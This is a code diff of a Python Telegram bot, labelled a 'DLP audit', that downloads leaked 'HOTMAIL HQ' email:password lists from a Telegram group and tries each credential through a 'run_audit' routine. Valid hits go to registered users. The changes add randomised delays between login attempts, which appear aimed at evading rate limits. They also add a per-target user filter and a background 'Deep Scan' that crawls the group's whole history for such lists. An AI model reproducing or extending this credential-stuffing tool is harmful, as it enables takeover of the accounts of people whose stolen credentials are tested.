@@ -4,6 +4,8 @@ import time
 import threading
 import base64
 import requests
+import asyncio
+import random
 from urllib.parse import urlparse
 
 try:
@@ -49,7 +51,7 @@ class DummyQueue:
     def put(self, item):
         pass
 
-def process_file_and_scan(file_path, target_notif_chat=None):
+def process_file_and_scan(file_path, target_notif_chat=None, target_user_filter=None):
     print("📥 Archivo detectado. Iniciando Auditoría DLP automática...")
     hits_buffer = []
     
@@ -88,10 +90,13 @@ def process_file_and_scan(file_path, target_notif_chat=None):
     for cred in valid_creds:
         email, pwd = cred.split(':', 1)
         try:
-            # We pass multi_user=True and the hit_buffer
-            run_audit(dummy_q, email.strip(), pwd.strip(), multi_user=True, hit_buffer=hits_buffer)
+            # We pass multi_user=True, the hit_buffer and the user filter
+            run_audit(dummy_q, email.strip(), pwd.strip(), multi_user=True, hit_buffer=hits_buffer, target_user_filter=target_user_filter)
         except Exception as e:
             print(f"Error scanning {email}: {e}")
+        
+        # 'Tiempo al tiempo' - delay between credentials
+        time.sleep(random.uniform(0.5, 1.2))
             
     print(f"🏁 Auditoría de {len(valid_creds)} objetivos finalizada.")
 
@@ -156,12 +161,94 @@ def send_consolidated_report(hits):
         except Exception as e:
             print(f"Error enviando reporte bot: {e}")
 
-def fire_and_forget_scan(file_path):
+def fire_and_forget_scan(file_path, target_user_filter=None):
     # This runs in a background thread, far away from Telethon's asyncio loop
     try:
-        process_file_and_scan(file_path, "me")
+        process_file_and_scan(file_path, "me", target_user_filter=target_user_filter)
     except Exception as e:
         print(f"Crit Error in Scanner Thread: {e}")
+
+async def check_and_process_deep_scans():
+    """Polls database for deep scan requests and processes them slowly."""
+    print("⏳ Deep Scan Poller iniciado...")
+    import server
+    from server import get_db_conn, q
+    
+    while True:
+        try:
+            conn = get_db_conn()
+            c = conn.cursor()
+            c.execute(q("SELECT id, username FROM scan_requests WHERE status = 'pending' LIMIT 1"))
+            job = c.fetchone()
+            
+            if job:
+                job_id, username = job
+                print(f"🚀 Iniciando Deep Scan para: {username}")
+                c.execute(q("UPDATE scan_requests SET status = 'processing' WHERE id = ?"), (job_id,))
+                conn.commit()
+                conn.close()
+                
+                try:
+                    await run_historic_crawl(username)
+                    
+                    conn = get_db_conn()
+                    c = conn.cursor()
+                    c.execute(q("UPDATE scan_requests SET status = 'completed' WHERE id = ?"), (job_id,))
+                    conn.commit()
+                    conn.close()
+                    print(f"✅ Deep Scan completado para: {username}")
+                except Exception as e:
+                    print(f"❌ Error en Deep Scan ({username}): {e}")
+                    conn = get_db_conn()
+                    c = conn.cursor()
+                    c.execute(q("UPDATE scan_requests SET status = 'failed' WHERE id = ?"), (job_id,))
+                    conn.commit()
+                    conn.close()
+            else:
+                conn.close()
+        except Exception as e:
+            print(f"Error poll scan_jobs: {e}")
+            
+        await asyncio.sleep(60) # Poll every minute
+
+async def run_historic_crawl(username):
+    """Crawls history, downloads HOTMAIL HQ files and scans them for a specific user."""
+    # Ensure client is connected
+    if not client.is_connected():
+        await client.connect()
+        
+    target_chat = None
+    async for dialog in client.iter_dialogs():
+        if TARGET_GROUP.lower() in dialog.name.lower():
+            target_chat = dialog.entity
+            break
+            
+    if not target_chat:
+        raise Exception(f"Grupo '{TARGET_GROUP}' no encontrado")
+
+    print(f"📑 Crawleando historia en '{TARGET_GROUP}' para '{username}'...")
+    
+    files_found = 0
+    # Iterar sobre TODO el historial
+    async for msg in client.iter_messages(target_chat, limit=None):
+        if msg.document or msg.file:
+            fname = getattr(msg.file, 'name', '') or ''
+            # Solo archivos HOTMAIL HQ (independiente de mayúsculas/minúsculas)
+            if "hotmail hq" in fname.lower() or "hotmail hq" in (msg.message or "").lower():
+                files_found += 1
+                local_path = os.path.join(DOWNLOAD_DIR, f"deep_{int(time.time())}_{fname if fname else 'list.txt'}")
+                print(f"   📥 [{files_found}] Descargando: {fname}")
+                await msg.download_media(local_path)
+                
+                # Procesar el archivo (esto es lo que consume tiempo)
+                # Lo hacemos en el mismo hilo de crawl para forzar 'tiempo al tiempo'
+                process_file_and_scan(local_path, target_user_filter=username)
+                
+                # 'Tiempo al tiempo' - delay entre archivos históricos
+                print(f"   ⏳ Esperando entre archivos...")
+                await asyncio.sleep(random.uniform(10, 20))
+                
+    print(f"🏁 Finalizado crawl de historia. Se procesaron {files_found} archivos para {username}.")
 
 # =======================================================
 # TELEGRAM EVENTS
@@ -261,6 +348,9 @@ async def main():
     if FILTER_KEYWORD:
         print(f"🔍 FILTRO ACTIVO: Solo descargará archivos que digan '{FILTER_KEYWORD}'")
     print("Los HITS positivos se enviarán al Telegram de cada usuario registrado.")
+    
+    # Iniciar poller de Deep Scan en el mismo loop
+    asyncio.create_task(check_and_process_deep_scans())
     
     await client.run_until_disconnected()
 
